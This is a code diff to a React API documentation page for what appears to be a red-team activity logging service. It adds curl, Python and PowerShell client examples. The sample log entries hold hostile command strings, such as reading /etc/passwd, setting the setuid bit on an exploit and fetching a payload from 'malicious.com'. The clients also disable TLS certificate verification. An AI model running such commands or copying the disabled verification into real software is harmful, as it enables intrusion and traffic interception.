@@ -101,31 +101,6 @@ const ApiDocumentation = () => {
           {openSections.endpoints && (
             <div className="p-4">
               <div className="space-y-6">
-                {/* Status endpoint */}
-                <div>
-                  <div className="flex items-center gap-2 mb-2">
-                    <span className="bg-blue-600 text-white px-2 py-1 rounded text-xs font-bold">GET</span>
-                    <span className="text-white font-mono">/ingest/status</span>
-                  </div>
-                  <p className="text-gray-300 mb-2">
-                    Check API connectivity and validate your API key.
-                  </p>
-                  <div className="bg-gray-900 p-3 rounded-md mb-3">
-                    <div className="flex justify-between items-center mb-2">
-                      <span className="text-blue-300 font-medium">Response Format</span>
-                    </div>
-                    <pre className="text-gray-300 font-mono text-sm whitespace-pre-wrap overflow-x-auto">{`{
-  "status": "ok",
-  "apiKey": {
-    "name": "Your API Key Name",
-    "keyId": "abc123",
-    "permissions": ["logs:write"]
-  },
-  "timestamp": "2025-03-06T12:34:56.789Z"
-}`}</pre>
-                  </div>
-                </div>
-
                 {/* Log submission endpoint */}
                 <div>
                   <div className="flex items-center gap-2 mb-2">
@@ -223,7 +198,7 @@ const ApiDocumentation = () => {
                     <div className="flex justify-between items-center mb-2">
                       <span className="text-blue-300 font-medium">Submitting a log</span>
                       <button 
-                        onClick={() => copyToClipboard(`curl -X POST https://yourdomain.com/ingest/logs \\
+                        onClick={() => copyToClipboard(`curl -k -X POST https://your-IP-or-Host:3000/ingest/logs \\
   -H "Content-Type: application/json" \\
   -H "X-API-Key: rtl_yourkey_abc123" \\
   -d '{
@@ -243,7 +218,7 @@ const ApiDocumentation = () => {
                         <Copy size={16} />
                       </button>
                     </div>
-                    <pre className="text-gray-300 font-mono text-sm whitespace-pre-wrap overflow-x-auto">{`curl -X POST https://yourdomain.com/ingest/logs \\
+                    <pre className="text-gray-300 font-mono text-sm whitespace-pre-wrap overflow-x-auto">{`curl -k -X POST https://your-IP-or-Host:3000/ingest/logs \\
   -H "Content-Type: application/json" \\
   -H "X-API-Key: rtl_yourkey_abc123" \\
   -d '{
@@ -271,15 +246,19 @@ const ApiDocumentation = () => {
                       <span className="text-blue-300 font-medium">Simple client</span>
                       <button 
                         onClick={() => copyToClipboard(`import requests
+import urllib3
+
+# Disable SSL warnings for self-signed certificates
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 def send_log(api_key, log_data):
-    url = "https://yourdomain.com/ingest/logs"
+    url = "https://your-IP-or-Host:3000/ingest/logs"
     headers = {
         "Content-Type": "application/json",
         "X-API-Key": api_key
     }
     
-    response = requests.post(url, headers=headers, json=log_data)
+    response = requests.post(url, headers=headers, json=log_data, verify=False)
     response.raise_for_status()
     return response.json()
 
@@ -301,15 +280,19 @@ print(result)`)}
                       </button>
                     </div>
                     <pre className="text-gray-300 font-mono text-sm whitespace-pre-wrap overflow-x-auto">{`import requests
+import urllib3
+
+# Disable SSL warnings for self-signed certificates
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 def send_log(api_key, log_data):
-    url = "https://yourdomain.com/ingest/logs"
+    url = "https://your-IP-or-Host:3000/ingest/logs"
     headers = {
         "Content-Type": "application/json",
         "X-API-Key": api_key
     }
     
-    response = requests.post(url, headers=headers, json=log_data)
+    response = requests.post(url, headers=headers, json=log_data, verify=False)
     response.raise_for_status()
     return response.json()
 
@@ -324,6 +307,120 @@ log_data = {
 
 result = send_log(api_key, log_data)
 print(result)`}</pre>
+                  </div>
+                </div>
+
+                {/* PowerShell example */}
+                <div>
+                  <h3 className="text-white font-medium mb-2 flex items-center gap-2">
+                    <Code size={16} />
+                    PowerShell Example
+                  </h3>
+                  <div className="bg-gray-900 p-3 rounded-md">
+                    <div className="flex justify-between items-center mb-2">
+                      <span className="text-blue-300 font-medium">PowerShell client</span>
+                      <button 
+                        onClick={() => copyToClipboard(`# Disable SSL certificate validation for self-signed certs
+[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
+
+$url = "https://your-IP-or-Host:3000/ingest/logs"
+$headers = @{
+    "Content-Type" = "application/json"
+    "X-API-Key" = "rtl_yourkey_abc123"
+}
+$payload = @{
+    internal_ip = "192.168.1.100"
+    external_ip = "203.0.113.1"
+    hostname = "victim-host"
+    domain = "example.org"
+    username = "jsmith"
+    command = "cat /etc/passwd"
+    notes = "Privilege escalation attempt"
+    filename = "passwd"
+    status = "ON_DISK"
+} | ConvertTo-Json
+
+$response = Invoke-RestMethod -Uri $url -Method Post -Headers $headers -Body $payload -ContentType "application/json"
+$response | ConvertTo-Json`)}
+                        className="text-gray-400 hover:text-white p-1 rounded"
+                        title="Copy to clipboard"
+                      >
+                        <Copy size={16} />
+                      </button>
+                    </div>
+                    <pre className="text-gray-300 font-mono text-sm whitespace-pre-wrap overflow-x-auto">{`# Disable SSL certificate validation for self-signed certs
+[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
+
+$url = "https://your-IP-or-Host:3000/ingest/logs"
+$headers = @{
+    "Content-Type" = "application/json"
+    "X-API-Key" = "rtl_yourkey_abc123"
+}
+$payload = @{
+    internal_ip = "192.168.1.100"
+    external_ip = "203.0.113.1"
+    hostname = "victim-host"
+    domain = "example.org"
+    username = "jsmith"
+    command = "cat /etc/passwd"
+    notes = "Privilege escalation attempt"
+    filename = "passwd"
+    status = "ON_DISK"
+} | ConvertTo-Json
+
+$response = Invoke-RestMethod -Uri $url -Method Post -Headers $headers -Body $payload -ContentType "application/json"
+$response | ConvertTo-Json`}</pre>
+                  </div>
+                </div>
+
+                {/* Batch logs example */}
+                <div>
+                  <h3 className="text-white font-medium mb-2 flex items-center gap-2">
+                    <Terminal size={16} />
+                    Submitting Multiple Logs
+                  </h3>
+                  <div className="bg-gray-900 p-3 rounded-md">
+                    <div className="flex justify-between items-center mb-2">
+                      <span className="text-blue-300 font-medium">cURL Batch Example</span>
+                      <button 
+                        onClick={() => copyToClipboard(`curl -k -X POST https://your-IP-or-Host:3000/ingest/logs \\
+  -H "Content-Type: application/json" \\
+  -H "X-API-Key: rtl_yourkey_abc123" \\
+  -d '[
+    {
+      "internal_ip": "192.168.1.100",
+      "hostname": "host-1",
+      "command": "chmod +s /tmp/exploit"
+    },
+    {
+      "external_ip": "198.51.100.1",
+      "hostname": "host-2",
+      "domain": "example.org",
+      "command": "wget http://malicious.com/payload"
+    }
+  ]'`)}
+                        className="text-gray-400 hover:text-white p-1 rounded"
+                        title="Copy to clipboard"
+                      >
+                        <Copy size={16} />
+                      </button>
+                    </div>
+                    <pre className="text-gray-300 font-mono text-sm whitespace-pre-wrap overflow-x-auto">{`curl -k -X POST https://your-IP-or-Host:3000/ingest/logs \\
+  -H "Content-Type: application/json" \\
+  -H "X-API-Key: rtl_yourkey_abc123" \\
+  -d '[
+    {
+      "internal_ip": "192.168.1.100",
+      "hostname": "host-1",
+      "command": "chmod +s /tmp/exploit"
+    },
+    {
+      "external_ip": "198.51.100.1",
+      "hostname": "host-2",
+      "domain": "example.org",
+      "command": "wget http://malicious.com/payload"
+    }
+  ]'`}</pre>
                   </div>
                 </div>
               </div>
@@ -430,11 +527,6 @@ print(result)`}</pre>
                     </tr>
                   </thead>
                   <tbody>
-                    <tr className="border-b border-gray-700">
-                      <td className="py-2 font-mono">/ingest/status</td>
-                      <td className="py-2">10 requests</td>
-                      <td className="py-2">1 minute</td>
-                    </tr>
                     <tr>
                       <td className="py-2 font-mono">/ingest/logs</td>
                       <td className="py-2">60 requests</td>
